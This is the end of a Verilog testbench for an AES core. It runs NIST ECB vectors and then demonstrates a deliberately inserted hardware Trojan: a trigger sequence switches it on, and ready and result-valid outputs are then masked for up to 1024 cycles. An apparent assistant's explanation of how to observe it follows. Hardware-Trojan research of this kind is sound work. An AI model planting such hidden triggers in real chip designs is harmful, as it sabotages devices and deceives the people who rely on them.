    reg [127 : 0] nist_ecb_256_enc_expected1;
    reg [127 : 0] nist_ecb_256_enc_expected2;
    reg [127 : 0] nist_ecb_256_enc_expected3;
    reg [127 : 0] nist_ecb_256_enc_expected4;

    nist_aes128_key1 = 256'h2b7e151628aed2a6abf7158809cf4f3c00000000000000000000000000000000;
    nist_aes128_key2 = 256'h000102030405060708090a0b0c0d0e0f00000000000000000000000000000000;
    nist_aes256_key1 = 256'h603deb1015ca71be2b73aef0857d77811f352c073b6108d72d9810a30914dff4;
    nist_aes256_key2 = 256'h000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f;

    nist_plaintext0 = 128'h6bc1bee22e409f96e93d7e117393172a;
    nist_plaintext1 = 128'hae2d8a571e03ac9c9eb76fac45af8e51;
    nist_plaintext2 = 128'h30c81c46a35ce411e5fbc1191a0a52ef;
    nist_plaintext3 = 128'hf69f2445df4f9b17ad2b417be66c3710;
    nist_plaintext4 = 128'h00112233445566778899aabbccddeeff;

    nist_ecb_128_enc_expected0 = 128'h3ad77bb40d7a3660a89ecaf32466ef97;
    nist_ecb_128_enc_expected1 = 128'hf5d3d58503b9699de785895a96fdbaaf;
    nist_ecb_128_enc_expected2 = 128'h43b1cd7f598ece23881b00e3ed030688;
    nist_ecb_128_enc_expected3 = 128'h7b0c785e27e8ad3f8223207104725dd4;
    nist_ecb_128_enc_expected4 = 128'h69c4e0d86a7b0430d8cdb78070b4c55a;

    nist_ecb_256_enc_expected0 = 128'hf3eed1bdb5d2a03c064b5a7e3db181f8;
    nist_ecb_256_enc_expected1 = 128'h591ccb10d410ed26dc5ba74a31362870;
    nist_ecb_256_enc_expected2 = 128'hb6ed21b99ca6f4f9f153e7b1beafed1d;
    nist_ecb_256_enc_expected3 = 128'h23304b7a39f9f3ff067d8d8f9e24ecc7;
    nist_ecb_256_enc_expected4 = 128'h8ea2b7ca516745bfeafc49904b496089;

    $display("   -= Testbench for aes core started =-");
    $display("     ================================\n");

    init_sim();
    dump_dut_state();
    reset_dut();
    dump_dut_state();

    // ---------------- NIST functional tests (unchanged) ----------------
    $display("ECB 128 bit key tests");
    $display("---------------------");
    ecb_mode_single_block_test(8'h01, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                               nist_plaintext0, nist_ecb_128_enc_expected0);

    ecb_mode_single_block_test(8'h02, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                               nist_plaintext1, nist_ecb_128_enc_expected1);

    ecb_mode_single_block_test(8'h03, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                               nist_plaintext2, nist_ecb_128_enc_expected2);

    ecb_mode_single_block_test(8'h04, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                               nist_plaintext3, nist_ecb_128_enc_expected3);

    ecb_mode_single_block_test(8'h05, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                               nist_ecb_128_enc_expected0, nist_plaintext0);

    ecb_mode_single_block_test(8'h06, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                               nist_ecb_128_enc_expected1, nist_plaintext1);

    ecb_mode_single_block_test(8'h07, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                               nist_ecb_128_enc_expected2, nist_plaintext2);

    ecb_mode_single_block_test(8'h08, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                               nist_ecb_128_enc_expected3, nist_plaintext3);

    ecb_mode_single_block_test(8'h09, AES_ENCIPHER, nist_aes128_key2, AES_128_BIT_KEY,
                               nist_plaintext4, nist_ecb_128_enc_expected4);

    ecb_mode_single_block_test(8'h0a, AES_DECIPHER, nist_aes128_key2, AES_128_BIT_KEY,
                               nist_ecb_128_enc_expected4, nist_plaintext4);

    $display("\nECB 256 bit key tests");
    $display("---------------------");
    ecb_mode_single_block_test(8'h10, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                               nist_plaintext0, nist_ecb_256_enc_expected0);

    ecb_mode_single_block_test(8'h11, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                               nist_plaintext1, nist_ecb_256_enc_expected1);

    ecb_mode_single_block_test(8'h12, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                               nist_plaintext2, nist_ecb_256_enc_expected2);

    ecb_mode_single_block_test(8'h13, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                               nist_plaintext3, nist_ecb_256_enc_expected3);

    ecb_mode_single_block_test(8'h14, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                               nist_ecb_256_enc_expected0, nist_plaintext0);

    ecb_mode_single_block_test(8'h15, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                               nist_ecb_256_enc_expected1, nist_plaintext1);

    ecb_mode_single_block_test(8'h16, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                               nist_ecb_256_enc_expected2, nist_plaintext2);

    ecb_mode_single_block_test(8'h17, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                               nist_ecb_256_enc_expected3, nist_plaintext3);

    ecb_mode_single_block_test(8'h18, AES_ENCIPHER, nist_aes256_key2, AES_256_BIT_KEY,
                               nist_plaintext4, nist_ecb_256_enc_expected4);

    ecb_mode_single_block_test(8'h19, AES_DECIPHER, nist_aes256_key2, AES_256_BIT_KEY,
                               nist_ecb_256_enc_expected4, nist_plaintext4);

    // ---------------- Trojan demonstration ----------------
    $display("\n================ TROJAN DEMONSTRATION ================\n");
    // Make sure we start clean for the demo.
    reset_dut();

    // Use a simple key load so DUT is in a normal operational state.
    tb_key    = nist_aes128_key1;
    tb_keylen = AES_128_BIT_KEY;
    tb_init   = 1; #(2*CLK_PERIOD); tb_init = 0;
    wait_ready();

    // Drive the trigger sequence and check the trojan state/output masking.
    trojan_drive_sequence();

    if (dut.trojan_state_reg != TROJAN_ON) begin
      $display("*** ERROR: Trojan did not enter ON state. Current state=0x%0x",
               dut.trojan_state_reg);
      error_ctr = error_ctr + 1;
    end

    prove_trojan_masking();

    // (Optional) Let the sim run longer if you want to observe eventual auto-clear
    // #(1100*CLK_PERIOD); // Trojan clears after 1024 cycles in DUT

    display_test_result();
    $display("\n*** AES core simulation done. ***");
    $finish;
  end

endmodule

//======================================================================
// EOF tb_aes_core.v
//======================================================================
```

### How to see it work

* Look for `>>> Driving Trojan trigger sequence...` followed by the printed `trojan_state_reg` becoming `2` (TROJAN_ON).
* Then, during `prove_trojan_masking`, the testbench requests an encryption (`tb_next=1`) and immediately checks over 64 cycles that:

  * `tb_ready` stays `0`
  * `tb_result_valid` stays `0`
* That’s the Trojan masking behavior by design (your core forces both low for up to 1024 cycles while `TROJAN_ON`).

If you want, I can also add a final observation window to show that after ~1024 cycles the Trojan auto-clears and `ready` starts behaving normally again.
